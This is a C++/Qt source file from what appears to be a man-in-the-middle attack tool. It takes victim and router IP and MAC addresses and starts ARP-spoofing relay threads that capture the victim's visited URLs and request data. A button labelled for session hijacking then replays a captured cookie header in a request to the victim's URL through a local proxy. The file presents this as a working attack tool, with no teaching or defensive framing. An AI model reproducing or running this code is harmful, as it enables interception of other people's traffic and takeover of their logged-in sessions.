#include "spoofurl.h"
#include "ui_spoofurl.h"
#include <QNetworkAccessManager>
#include <QNetworkProxy>
#include <QNetworkCookie>
#include <QNetworkCookieJar>

QStringList spoof_urlList, spoof_dataList;
pcap_t *goToUrl;
u_char *getUrlPacket;

spoofUrl::spoofUrl(QWidget *parent) : QDialog(parent), ui(new Ui::spoofUrl) {
    ui->setupUi(this);
    ui->listView->setEditTriggers(QAbstractItemView::NoEditTriggers);
}

spoofUrl::~spoofUrl() {
    delete ui;
}

//  Session hijacking <-- cookie inject
void spoofUrl::on_GoUrlBtn_clicked() {
    QString url = ui->listView->currentIndex().data().toString();
    QString data = spoof_dataList.at(ui->listView->currentIndex().row());
//    QNetworkCookieJar::setCookiesFromUrl(spoof_dataList.at(ui->listView->currentIndex().row()), url);
    QNetworkAccessManager *manager = new QNetworkAccessManager();
    QNetworkProxy proxy;
    proxy.setType(QNetworkProxy::HttpProxy);
    proxy.setHostName("127.0.0.1");
    proxy.setPort(8080);
    manager->setProxy(proxy);
    manager->setCookieJar(new QNetworkCookieJar());
    QNetworkRequest netRequest(url);
    netRequest.setHeader(QNetworkRequest::CookieHeader, data.toStdString().c_str());
    manager->post(netRequest, "http://www.naver.com");
//    QDesktopServices::openUrl(url);
}

void spoofUrl::on_StopBtn_clicked() {
    this->allStop();
    this->finished(1);
}

void spoofUrl::on_CancelBtn_clicked() {
    this->allStop();
    this->finished(1);
    this->close();
}

void spoofUrl::spoofGetInfo(QString relayGetVictimIP, QString relayGetVictimMac, QString relayGetRouterIP, QString relayGetRouterMac, QString relayGetAtkMac, QString relayGetLen, u_char *relayPacket, pcap_t *relayPcap, pcap_if_t *relayDevs) {
    goToUrl = relayPcap;
    getUrlPacket = relayPacket;
    relayFalsify = new relay_falsify(this);
    relayFalsify->relayGetInfo(relayGetVictimIP, relayGetVictimMac, relayGetRouterIP, relayGetRouterMac, relayGetAtkMac, relayGetLen, relayPacket, relayPcap);
    relayFalsify->start();
    relaySpoof = new relay_spoof(this);
    relaySpoof->relayGetMacInfo(relayGetVictimMac, relayGetAtkMac, relayGetRouterMac, relayDevs);
    relaySpoof->start();
    spoof_md = new QStringListModel();
    connect(relaySpoof, SIGNAL(relay_urlList(QStringList)), this, SLOT(spoof_getUrl(QStringList)));
    connect(relaySpoof, SIGNAL(relay_dataList(QStringList)), this, SLOT(spoof_postUrl(QStringList)));
    connect(relaySpoof, SIGNAL(relay_spoofFin(bool)), this, SLOT(spoof_getFin(bool)));
}

void spoofUrl::spoof_getUrl(QStringList url_list) {
    spoof_urlList = url_list;
    spoof_md->setStringList(spoof_urlList);
    ui->listView->setModel(spoof_md);
}

void spoofUrl::spoof_postUrl(QStringList data_list) {
    spoof_dataList = data_list;
    //pcap_sendpacket(goToUrl, getUrlPacket, sizeof(getUrlPacket));
}

void spoofUrl::spoof_getFin(bool) {
    QMessageBox::information(this, "Spoof Finish", "Spoofing is finished!!");
}

void spoofUrl::allStop() {
    relayFalsify->falsifyStop = false;
    relaySpoof->spoofStop = true;
}
